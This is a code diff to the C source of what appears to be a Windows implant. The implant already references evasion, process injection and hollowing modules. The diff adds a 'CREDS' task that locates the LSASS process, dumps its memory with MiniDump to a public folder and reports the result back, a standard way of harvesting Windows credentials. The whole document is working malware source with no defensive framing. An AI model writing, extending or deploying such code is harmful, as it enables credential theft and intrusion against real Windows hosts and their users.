@@ -22,6 +22,7 @@
 #include "evasion.h"
 #include "injection.h"
 #include "hollowing.h"
+#include "lsass.h"
 #include <winhttp.h>
 #include <bcrypt.h>
 #include <wincrypt.h>
@@ -1310,6 +1311,40 @@ VOID ImplantMain(PIMPLANT_CONFIG pConfig) {
                             }
                         } else {
                             strcpy(res->szError, "inject: target and shellcode data required");
+                        }
+                        dwResultCount++;
+                        break;
+                    }
+
+                    // ── CREDS (LSASS dump: handle dup + fork + MiniDump) ──
+                    case TASK_CREDS: {
+                        DWORD dwPid = 0;
+                        CHAR  szPath[MAX_PATH] = {0};
+                        CHAR  szMsg[512] = {0};
+
+                        if (pTasks[i].dwArgCount > 0 && pTasks[i].szArgs[0][0] != '\0') {
+                            strncpy(szPath, pTasks[i].szArgs[0], MAX_PATH - 1);
+                            szPath[MAX_PATH - 1] = '\0';
+                        } else {
+                            sprintf(szPath, "C:\\Users\\Public\\lsass_%lu.dmp",
+                                    (unsigned long)GetCurrentProcessId());
+                        }
+
+                        if (!FindLsassPid(&dwPid)) {
+                            strcpy(res->szError, "lsass: process not found");
+                        } else if (DumpLsassViaMiniDump(dwPid, szPath)) {
+                            sprintf(szMsg, "[+] LSASS dumped to %s", szPath);
+                        } else {
+                            strcpy(szMsg, "[-] LSASS dump failed (run elevated)");
+                        }
+
+                        if (szMsg[0]) {
+                            DWORD mlen = (DWORD)strlen(szMsg);
+                            res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, mlen + 1);
+                            if (res->pOutput) {
+                                memcpy(res->pOutput, szMsg, mlen);
+                                res->dwOutputLen = mlen;
+                            }
                         }
                         dwResultCount++;
                         break;
